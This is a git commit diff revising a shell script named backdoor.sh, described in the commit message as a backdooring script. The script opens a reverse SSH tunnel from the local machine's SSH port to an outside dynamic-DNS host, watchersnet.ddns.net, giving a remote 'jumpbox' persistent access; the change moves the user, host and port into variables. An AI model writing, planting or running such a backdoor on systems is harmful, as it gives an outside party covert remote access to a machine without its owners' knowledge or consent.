4f6631b419274313e51c2367c9527702780e0da3
shemhazai <andre.marques@fatec.sp.gov.br>
2017-02-06 18:24:59 -0200

    Backdooring script revised

--- backdoor.sh
+++ backdoor.sh
@@ -1,15 +1,17 @@
 #!/bin/bash
 
+user=shemhazai
+remote=watchersnet.ddns.net
+lport=18000
+
 function tunnel
 {
-    /usr/bin/ssh -N -R 18000:localhost:22 shemhazai@watchersnet.ddns.net
+    /usr/bin/ssh -N -R ${lport}:localhost:22 ${user}@${remote}
     if [[ $? -eq 0 ]]; then
         echo "Tunnel to jumpbox created successfully."
     else
         echo An error occurred creating a tunnel to jumpbox. Err: $?
     fi
 }
-
-
 
 tunnel
